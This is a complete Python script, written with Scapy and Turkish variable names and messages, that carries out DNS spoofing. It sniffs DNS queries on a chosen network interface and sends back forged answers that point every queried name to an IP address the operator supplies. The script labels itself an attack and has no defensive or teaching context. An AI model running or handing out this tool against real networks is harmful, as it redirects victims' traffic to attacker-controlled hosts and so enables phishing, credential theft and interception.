from scapy.all import *
import sys

def dns_spoof(packet, sahte_ip):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  
        sahte_dns_cevabi = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, 
                               an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=sahte_ip))

        send(sahte_dns_cevabi, verbose=0)
        print(f"[+] {packet[DNS].qd.qname.decode()} sorgusu için sahte cevap gönderildi: {sahte_ip}")

def basla_saldiri(iface, hedef_ip):
    print("[*] Saldırı başlatıldı. Çıkmak için Ctrl+C tuşlarına basın.")
    sniff(iface=iface, filter="udp port 53", prn=lambda packet: dns_spoof(packet, hedef_ip))

if __name__ == "__main__":
    iface = input("Ağ arayüzünü girin (örn. eth0, wlan0): ")
    hedef_ip = input("DNS sorgularına sahte cevap göndermek için kullanılacak IP adresini girin: ")
    
    try:
        basla_saldiri(iface, hedef_ip)
    except KeyboardInterrupt:
        print("\n[!] Saldırı durduruldu.")
        sys.exit(0)
